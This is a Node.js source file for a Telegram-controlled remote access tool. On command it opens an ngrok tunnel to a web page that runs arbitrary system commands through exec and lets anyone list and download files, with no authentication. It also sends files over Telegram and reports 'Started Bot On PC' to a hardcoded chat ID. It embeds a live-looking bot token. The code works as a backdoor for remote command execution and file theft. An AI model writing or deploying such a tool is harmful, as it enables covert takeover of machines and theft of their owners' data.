const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const { exec } = require('child_process');
const ngrok = require('ngrok');
const fs = require('fs');
const path = require('path');

// Add this at the beginning to handle working directory
process.chdir(__dirname);

const TOKEN = '7465958311:AAGpyKZ5ziivSXmpLKUx8X2E6EZcRdA9DdA'; // Replace with your Telegram Bot Token
const bot = new TelegramBot(TOKEN, { polling: true });

const userSessions = {}; // Store user shell instances

// Function to create a new shell for a user
const createShell = async (chatId) => {
    if (userSessions[chatId]) {
        bot.sendMessage(chatId, "You already have an active terminal! Use /stop to close it.");
        return;
    }

    const app = express();
    app.use(express.urlencoded({ extended: true }));

    let currentDir = process.cwd(); // Start in the bot's directory

    // Serve a simple web UI
    app.get('/', (req, res) => {
        res.send(`
            <h2>Remote Windows Command Shell</h2>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Enter command" required>
                <button type="submit">Run</button>
            </form>
            <pre id="output"></pre>
            <script>
                document.querySelector('form').addEventListener('submit', async function(e) {
                    e.preventDefault();
                    let cmd = document.querySelector('[name=cmd]').value;
                    let res = await fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'cmd=' + encodeURIComponent(cmd) });
                    let text = await res.text();
                    document.querySelector('#output').innerText = text;
                });
            </script>
        `);
    });

    // Execute shell commands
    app.post('/', (req, res) => {
        let cmd = req.body.cmd;

        if (cmd.startsWith("cd ")) {
            let newPath = path.resolve(currentDir, cmd.slice(3));
            if (fs.existsSync(newPath) && fs.lstatSync(newPath).isDirectory()) {
                currentDir = newPath;
                return res.send(`Directory changed to: ${currentDir}`);
            } else {
                return res.send(`Invalid directory: ${newPath}`);
            }
        }

        exec(cmd, { cwd: currentDir }, (error, stdout, stderr) => {
            if (error) return res.send(`Error: ${error.message}`);
            if (stderr) return res.send(`Stderr: ${stderr}`);
            res.send(stdout || 'Command executed.');
        });
    });

    // List files in the current directory
    app.get('/list', (req, res) => {
        fs.readdir(currentDir, { withFileTypes: true }, (err, files) => {
            if (err) return res.send("Error reading directory");

            let fileList = files.map(file => {
                let type = file.isDirectory() ? "[DIR]" : "[FILE]";
                return `${type} ${file.name}`;
            }).join("\n");

            res.send(`<pre>${fileList}</pre>`);
        });
    });

    // Download a file
    app.get('/download', (req, res) => {
        let filePath = path.join(currentDir, req.query.file);
        if (fs.existsSync(filePath) && fs.lstatSync(filePath).isFile()) {
            res.download(filePath);
        } else {
            res.status(404).send("File not found.");
        }
    });

    const PORT = 3000 + chatId % 1000;
    const server = app.listen(PORT, async () => {
        const url = await ngrok.connect(PORT);
        userSessions[chatId] = { server, url, currentDir };
        bot.sendMessage(chatId, `✅ Your remote shell is ready!\n\n🔗 Access it here: ${url}\n\n- List files: ${url}/list\n- Download file: ${url}/download?file=FILENAME\n\nUse /stop to terminate your session.`);
    });
};

// Function to stop a user's shell
const stopShell = async (chatId) => {
    if (!userSessions[chatId]) {
        bot.sendMessage(chatId, "No active session found!");
        return;
    }

    userSessions[chatId].server.close(); // Stop the Express server
    await ngrok.disconnect(userSessions[chatId].url); // Close the ngrok tunnel
    delete userSessions[chatId];

    bot.sendMessage(chatId, "🚫 Your remote shell has been closed.");
};

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome! Use /shell to start a remote terminal.");
});

bot.onText(/\/shell/, (msg) => {
    createShell(msg.chat.id);
});

bot.onText(/\/stop/, (msg) => {
    stopShell(msg.chat.id);
});

// File Download via Telegram
bot.onText(/\/download (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!userSessions[chatId]) {
        bot.sendMessage(chatId, "No active session found!");
        return;
    }

    const filePath = path.join(userSessions[chatId].currentDir, match[1]);

    if (fs.existsSync(filePath) && fs.lstatSync(filePath).isFile()) {
        bot.sendDocument(chatId, filePath);
    } else {
        bot.sendMessage(chatId, "File not found.");
    }
});

console.log("🤖 Telegram Bot is running...");
bot.sendMessage(6896121968, "Started Bot On PC");
